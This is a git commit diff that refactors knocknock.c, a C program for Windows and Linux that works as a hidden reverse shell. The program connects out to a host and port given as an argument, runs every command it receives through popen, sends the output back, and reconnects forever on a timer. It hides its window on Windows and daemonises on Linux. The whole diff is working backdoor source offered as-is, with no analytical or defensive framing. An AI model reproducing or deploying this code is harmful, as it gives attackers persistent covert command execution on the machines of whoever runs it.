44513b2a511b18f65dce7366dddea246ed36e56e
thisforeda <thisforeda@live.cn>
2018-02-13 21:12:29 +0800

    clean the f**kn code, bechaos😶i have noting to do.

--- knocknock.c
+++ knocknock.c
@@ -6,87 +6,108 @@
 #include <stdlib.h>
 #include <string.h>
 
-#ifdef WIN32
+#define forever 1024
+#if defined(__linux) || defined(__linux__) || defined(linux)
+  #define LINUX
+  // Linux
+  #include <unistd.h>
+  #include <arpa/inet.h>
+
+  #define pipe_open            popen
+  #define pipe_close           pclose
+  #define fd_close             close
+
+#elif defined(__MINGW32__) || defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
+  #define WINDOWS
+  // Windows
   #include <winsock2.h>
   #include <windows.h>
-  #define popen _popen
-  #define pclose _pclose
-  #define close closesocket
-  #define sleep(seconds) Sleep(seconds * 1000)
+
+  #define pipe_open            _popen
+  #define pipe_close           _pclose
+  #define fd_close             closesocket
+  #define sleep(seconds)       Sleep(seconds * 1000)
+
   #pragma comment(lib, "ws2_32.lib")
   #pragma comment(lib, "user32.lib")
+
 #else
-  #include <unistd.h>
-  #include <sys/socket.h>
-  #include <arpa/inet.h>
+#error Unrecognized Platform.
 #endif
 
-typedef struct sockaddr sockaddr;
-typedef struct sockaddr_in sockaddr_in;
 
-
-void reverse_console(char* ip, short port) {
+void console(char* ip, unsigned short port) {
   FILE* pipe;
-  sockaddr_in sin;
-  char buffer[4096*2];
-  int sockfd, bytes_recv = 0, bytes_read = 0;
+  char buff[1024];
+  int sockfd, var = 0;
+  struct sockaddr_in sin;
 
-#ifdef WIN32
+#if defined(WINDOWS)
   WSADATA wsad;
   WSAStartup(MAKEWORD(2, 2), &wsad);
 #endif
 
-  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
-    // prepare connect.
-    sin.sin_family = AF_INET;
-  	sin.sin_port = htons(port);
-    sin.sin_addr.s_addr = inet_addr(ip);
-    if (connect(sockfd, (const sockaddr*)&sin, sizeof(sockaddr_in)) != -1) {
-      while (6) {
-        memset(buffer, 0, sizeof(buffer));
-        if ((bytes_recv = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
-          if ((pipe = (FILE*)popen(buffer, "r")) != NULL) {
-            // send output
-            while (!feof(pipe) && fread(buffer, 1, 1, pipe) == 1)
-              if (send(sockfd, buffer, 1, 0) != 1)
-                break;
-            pclose(pipe);
-            if(send(sockfd, "\x00\x00", 2, 0) <= 0)
-              break;
-          }
-        } else {
-          break;
-        }
-      }
-      close(sockfd);
-#ifdef WIN32
-      WSACleanup();
-#endif
-    }
+  sin.sin_family = AF_INET;
+  sin.sin_port   = htons(port);
+  sin.sin_addr.s_addr = inet_addr(ip);
+
+  sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  if (sockfd == -1)
+    return;
+
+  // connect to remote
+  var = connect(sockfd, (void*)&sin, sizeof(struct sockaddr_in));
+  if (var == -1)
+    return;
+
+  while (forever) {
+    // zero buffer
+    for (var = 0; var < sizeof(buff); var++)
+      buff[var] = 0;
+
+    // receive command line
+    if (recv(sockfd, buff, sizeof(buff), 0) <= 0)
+      break;
+    // execute command
+    if ((pipe = pipe_open(buff, "r")) == NULL)
+      break;
+    // send command output (only stdout)
+    while (!feof(pipe) && fread(buff, 1, 1, pipe) == 1)
+      if (send(sockfd, buff, 1, 0) != 1)
+        break;
+    // cleanup
+    pipe_close(pipe);
+    if (send(sockfd, "\x00\x00", 2, 0) != 2)
+      break;
   }
+  fd_close(sockfd);
+#ifdef WINDOWS
+  WSACleanup();
+#endif
 }
 
+
 int main(int argc, char* argv[]) {
-  char *host;
-  int port = 36987, t;
-  int interval = 60;
   char buff[512] = {0};
-  char sep[2] = ":", *next;
-  // no argument provided, default address;
-  // example: char *fixed_cmdline = "127.0.0.1:12369:360";
-  char *fixed_cmdline = NULL;
-#ifdef WIN32
-  // run in background.
+  char sep[2] = ":", *next, *host;
+  int port = 36987, interval = 60, t = 0;
+
+  // no argument provided, set default server address.
+  char *cmdline = "";
+  // means:
+  // if no argument provided (open executable directly)
+  // then use this string as the default argument.
+  // example: char *cmdline = "127.0.0.1:12369:60";
+
+  // run in background
+#if defined(WINDOWS)
   HANDLE hWnd = GetForegroundWindow();
   ShowWindow(hWnd, SW_HIDE);
-#else
+#elif defined(LINUX)
   daemon(0, 0);
 #endif
-  if (argc > 1) {
-    strncpy(buff, argv[1], sizeof(buff));
-  } else if (fixed_cmdline) {
-    strncpy(buff, fixed_cmdline, sizeof(buff));
-  }
+
+  strncpy(buff, argc > 1?argv[1]: cmdline, sizeof(buff));
   if ((host = strtok(buff, sep)) != NULL) {
     // parse port
     next = strtok(NULL, sep);
@@ -98,8 +119,8 @@ int main(int argc, char* argv[]) {
     if (next && (t = atoi(next)) != 0)
       interval = t;
 
-    while (6) {
-      reverse_console(host, (short)port);
+    while (forever) {
+      console(host, (unsigned short)port);
       sleep(interval);
     }
   }
